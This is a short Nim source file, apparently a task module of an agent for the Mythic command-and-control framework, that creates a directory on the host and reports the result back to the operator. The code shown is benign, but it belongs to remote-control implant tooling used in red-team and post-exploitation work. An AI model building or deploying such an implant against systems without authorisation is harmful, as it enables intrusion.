import ../config
import ../utils/mythic_responses
import std/[json, os, strformat]

type
  MkdirArgs = object
    path: string

proc makeDirectory*(taskId: string, params: string): JsonNode =
  let cfg = getConfig()
  
  # Parse arguments
  let args = parseJson(params).to(MkdirArgs)
  
  if cfg.debug:
    echo "[DEBUG] Creating directory: ", args.path
  
  try:
    # Create the directory (including parent directories)
    createDir(args.path)
    
    # Get the absolute path
    let absPath = if isAbsolute(args.path):
      args.path
    else:
      getCurrentDir() / args.path
    
    let normalizedPath = normalizedPath(absPath)
    
    if cfg.debug:
      echo "[DEBUG] Created directory: ", normalizedPath
    
    return mythicSuccess(taskId, &"Created directory '{normalizedPath}'")
    
  except OSError as e:
    return mythicError(taskId, &"Failed to create directory: {e.msg}")
  except Exception as e:
    return mythicError(taskId, &"Error: {e.msg}")
